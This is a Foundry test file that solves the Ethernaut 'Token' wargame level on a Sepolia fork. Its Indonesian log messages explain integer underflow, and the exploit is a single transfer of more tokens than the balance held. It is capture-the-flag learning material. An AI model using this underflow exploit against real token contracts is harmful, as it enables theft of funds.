// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../06-Token/TokenFactory.sol";
import "forge-std/Test.sol";

contract TokenAttack is Test {
    function testToken() external {
        vm.createSelectFork(vm.envString("sepolia"));
        Ethernaut ethernaut = new Ethernaut();
        TokenFactory factory = new TokenFactory();
        ethernaut.registerLevel(factory);
        address agus = makeAddr("agus");
        vm.deal(agus, 10 ether);
        vm.startPrank(agus, agus);
        address addr = ethernaut.createLevelInstance(factory);
        Token token = Token(addr);
        emit log("setup done");
        emit log("goal: token balance > 20");
        emit log("Penjelasan");
        emit log("uint dan int memiliki ukuran maksimal dan minimal");
        emit log(
            "jika angka maksimal ditambah, maka akan kembali ke angka minimal; sedangkan angka minimal jika dikurang, maka akan menjadi angka maksimal"
        );
        emit log("itu yang disebut overflow dan underflow, dan versi ^0.8 sudah mengecek overflow underflow");
        emit log("PoC");
        emit log("transfer token ke address lain sebanyak melebihi balance yang dimiliki");
        token.transfer(address(token), 21);
        emit log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(address(token)));
        assertTrue(sukses);
    }
}
